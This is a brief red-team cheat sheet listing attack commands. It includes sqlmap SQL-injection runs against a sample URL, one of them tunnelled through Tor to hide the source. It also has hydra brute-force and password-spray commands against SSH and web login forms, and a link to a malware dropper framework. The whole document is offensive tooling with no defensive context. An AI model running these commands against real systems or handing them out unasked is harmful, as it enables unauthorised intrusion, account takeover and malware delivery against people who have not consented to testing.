# Red teaming notes
Script &amp; Notes for red teams operations


# enumeration
ping ip

whois ip

tracert ip

# database
sqlmap -u "http://website.com?id1=10&id2=10"

# sqlmap && tor
sqlmap -u "http://website.com?id1=10&id2=10" --tor --tor-type=SOCKS5


# malware repo
https://github.com/D4Vinci/Dr0p1t-Framework

# hydra pwd crack
hydra -L USER.TXT -P PASS.TXT 1.1.1.1 http-post-form "login.php:username-^USER^&password=^PASS^:Error"
hydra -L USER.TXT -P PASS.TXT 1.1.1.1 ssh

# hydra pwd spray attack
hydra -L users.txt -P passwords.txt 192.168.0.1 ssh -u

